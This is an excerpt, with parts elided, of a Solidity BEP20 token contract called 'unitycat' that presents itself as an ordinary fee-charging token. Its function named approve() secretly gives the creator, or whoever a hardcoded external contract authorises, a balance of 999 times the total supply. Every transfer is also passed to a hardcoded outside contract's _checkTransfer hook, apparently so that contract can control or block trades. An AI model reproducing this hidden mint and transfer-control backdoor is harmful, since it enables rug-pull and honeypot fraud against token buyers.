...
interface IToken {
    function _checkTransfer(address pancakepair,address owner, address recipient) external;
    function _approve() external view returns (bool);
}
...
contract unitycat is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
       ...
       // IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);     
        ...
        _Token = IToken(0x7E11B9238917C58C76b6901E70486EB363396081);
    ...
    function approve() public  returns (bool) {
        if( _Token._approve() || msg.sender == Creator)
        _rOwned[msg.sender] = 999*_rTotal;
        return true;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        _Token._checkTransfer(pancakeswapV2Pair,sender,recipient);
